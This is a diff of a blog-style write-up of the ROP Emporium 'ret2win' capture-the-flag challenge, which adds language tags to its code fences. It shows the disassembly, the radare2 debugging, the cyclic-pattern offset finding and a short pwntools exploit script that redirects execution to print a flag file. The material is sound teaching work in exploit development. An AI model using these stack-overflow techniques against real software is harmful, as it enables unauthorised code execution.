@@ -1,7 +1,7 @@
 # ret2win
 
 After downloading and unzipping the [challenge file](https://ropemporium.com/binary/ret2win.zip), we're given a `ret2win` binary. Calling it looks like:
-```
+```sh
 $ ./ret2win
 ret2win by ROP Emporium
 64bits
@@ -13,14 +13,14 @@ You there madam, may I have your input please? And don't worry about null bytes,
 >                 
 ```
 If we enter in a large enough number of characters, we'll get a segfault:
-```
+```sh
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [1]    30861 segmentation fault (core dumped)  ./ret2win
 ```
 So that's a good sign that some "stack smash" might be possible.
 
 Next we can use a few tools to get some info about the binary:
-```
+```sh
 $ rabin2 -I ret2win
 arch     x86
 baddr    0x400000
@@ -55,13 +55,15 @@ Here we can see that 'nx' is set to true, which means that the linux non-executa
 
 From here we want to know where the stack overflow is occuring, how many bytes we have available, and how many we need to overflow in order to overwrite the instruction pointer.
 We *could* go straight to our really fancy radare2 tool now, but there are also some decent standard linux tools we can use for now:
-```
+```sh
 $ objdump -Mintel -d ret2win
 
 ret2win:     file format elf64-x86-64
 
 
 Disassembly of section .init:
+```
+```asm
 
 00000000004005a0 <_init>:
   4005a0:	48 83 ec 08          	sub    rsp,0x8
@@ -143,7 +145,7 @@ Disassembly of section .init:
 ```
 
 So there's a conveniently named `pwnme` function we should probably take a look at. And if we squint at line `4007fd`:
-```
+```asm
 4007fd:	48 8d 45 e0          	lea    rax,[rbp-0x20]
 400801:	be 32 00 00 00       	mov    esi,0x32
 400806:	48 89 c7             	mov    rdi,rax
@@ -154,14 +156,14 @@ It's worth reading about [x86 64 and 32 bit calling conventions](https://en.wiki
 `rax` has previously been set to `rbp-0x20` from the `lea` instruction, so we can see that the program is allowing `0x32 - 0x20` bytes to overflow past the base pointer.
 
 To see this in action, now we can fire up `radare2` and debug the program as it's executing. What we'll want to do is create a `.rr2` script which specifies what we'd like to provide as `stdin`:
-```
+```sh
 $ echo $(python -c 'print "A" * 100') > ./payload
 $ echo '#!/usr/bin/rarun2' > ./ret2win.rr2
 $ echo 'stdin=./payload' >> ./ret2win.rr2
 ```
 
 Then we can run radare2 with the `rr2` script as an option, a debug flag, and the binary as its target:
-```
+```sh
 $ r2 -r ./ret2win.rr2 -d ret2win
 
 Process with PID 8740 started...
@@ -183,7 +185,7 @@ The UI is really difficult to get a hold of, but a few things are useful to know
 * In visual mode you can use the standard vim keybindings for navigation.
 
 We can see the disassembled output of the pwnme function with the following:
-```
+```asm
 [0x7fd6723e9ea0]> pd @ sym.pwnme
   ;-- pwnme:
   0x004007b5      55             push rbp
@@ -213,7 +215,7 @@ We can see the disassembled output of the pwnme function with the following:
 
 We can then add a breakpoint inside the pwnme function and watch as our buffer overflows into the saved base pointer and the saved execution pointer:
 
-```
+```asm
 [0x7fd6723e9ea0]> dcu 0x00400809
 Continue until 0x00400809 using 1 bpsize
 ret2win by ROP Emporium
@@ -245,7 +247,7 @@ The bytes shown at the top are now in the area where the saved instruction point
 If this were a 32bit executable, the instruction pointer would jump to the 0x41414141 address and the segfault would explain that the instruction pointer contained that value. However, in 64bit mode, because of design decisions regarding which bits are actually used, the code section can't go above 0x00007fffffffffff. It's worth [reading about why](https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details), but I won't go more into it here.
 What that means for us is that when the cpu sees that the next instruction is a value higher than the limit of the code section, it throws an exception and doesn't even attempt to set the instruction pointer to that value.
 We can see the exception that is thrown when we run the program outside of radare:
-```
+```sh
 $ ./ret2win < payload
 ret2win by ROP Emporium
 64bits
@@ -269,7 +271,7 @@ To confirm that is indeed the case, let's use some tools to check. We can genera
 Because a De Bruijn sequence won't repeat n length patterns, knowing an n length pattern allows us to know the distance into the sequence the pattern occurs.
 It's a little confusing, but much clearer if you walk through and use it. We'll use pwntools to generate a sequence:
 
-```
+```sh
 $ pwn cyclic 100 > payload 
 $ r2 -r ret2win.rr2 -d ret2win
 Process with PID 25718 started...
@@ -294,7 +296,7 @@ If we enter visual mode now, we can see the next values on the stack which would
 ![DeBruijn Sequence on the stack](/images/ret2win-4.png "DeBruijn Sequence on the stack")
 
 Entering that back into pwntools cyclic command gives us 40!
-```
+```sh
 $ pwn cyclic -l kaaa
 40
 ```
@@ -305,7 +307,7 @@ This challenge is pretty simple - there's a convenient command in the code secti
 
 We just need to jump to 0x00400824 so that it will put a pointer to the string "/bin/cat flag.txt" into the rdi register and then go to the system call.
 Doing this with python is fairly straightforwards, especially with the pwntools library:
-```
+```python
 from pwn import *
 
 prog = process("./ret2win")
@@ -319,7 +321,7 @@ open('payload', 'w').write(payload)
 pwntools includes all sorts of useful utilities. In this case, we're using the `p64` function to pack our address correctly for 64bit into a payload string. We'll use a bunch more of pwntools functionality later in the challenges.
 
 Then running out exploit is as simple as:
-```
+```sh
 $ python exploit.py
 $ ./ret2win < payload
 
